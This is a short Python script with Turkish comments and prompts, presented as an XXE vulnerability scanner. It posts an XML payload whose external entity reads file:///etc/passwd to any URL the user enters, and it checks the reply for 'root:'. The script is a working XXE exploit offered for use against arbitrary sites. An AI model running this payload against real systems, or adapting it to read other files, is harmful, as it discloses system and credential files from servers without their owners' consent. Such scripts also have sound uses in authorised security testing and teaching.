import requests

# XXE yükü içeren örnek XML verisi
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
"""

def scan_xxe_vulnerability(url):
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=xxe_payload, headers=headers)
    
    if "root:" in response.text:
        print(f"[!] Potansiyel XXE Açığı Bulundu: {url}")
    else:
        print(f"[+] Güvenli: {url}")

def main():
    url = input("Lütfen taranacak web sitesinin URL'sini girin (örn: http://example.com): ")
    scan_xxe_vulnerability(url)

if __name__ == "__main__":
    main()
